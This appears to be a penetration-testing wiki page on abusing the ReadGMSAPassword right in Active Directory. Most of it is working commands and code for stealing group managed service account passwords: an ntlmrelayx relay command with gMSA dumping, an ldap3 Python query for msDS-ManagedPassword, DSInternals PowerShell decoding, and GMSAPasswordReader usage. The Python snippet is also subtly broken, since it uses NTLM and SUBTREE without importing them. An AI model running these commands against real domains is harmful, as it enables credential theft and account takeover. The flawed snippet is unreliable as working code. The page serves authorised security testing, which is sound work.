# ReadGMSAPassword

This abuse can be carried out when controlling an object that has, for instance, `AllExtendedRights` over a target computer.

The attacker can read the gMSA \(group managed service accounts\) password of the account. 

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-like systems, Impacket's [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) tool can be used to read and decode gMSA passwords.

```bash
ntlmrelayx.py -t ldaps://10.0.0.5 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs 
```

{% hint style="success" %}
In order to easily fake a relayed authentication, once the relay servers are up and running, the tester can browe [http://127.0.0.1/](http://127.0.0.1/) in order to trigger a basic authentication that will then be relayed by ntlmrelayx, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96).
{% endhint %}

The `msDS-ManagedPassword` attribute can also be manually obtained by running the following Python script. The [following code](https://github.com/SecureAuthCorp/impacket/blob/3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L672-L702) can then be used to decode the blob.

```python
import ldap3
target_dn = "" # something like 'CN=Target User,OU=Standard Accounts,DC=domain,DC=local'
domain = "domain"
username = "username"
user = "{}\\{}".format(domain, username)
password = "password"
server = ldap3.Server(domain)
connection = ldap3.Connection(server = server, user = user, password = password, authentication = NTLM)
connection.bind()
connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
print(connection.entries)
```
{% endtab %}

{% tab title="Windows" %}
On Windows systems, there are multiple ways to read gMSA passwords.

The first one uses the Active Directory and DSInternals PowerShell modules.

```bash
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
```

The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) \(C\#\).

```bash
.\GMSAPasswordReader.exe --AccountName 'Target_Account'
```
{% endtab %}
{% endtabs %}

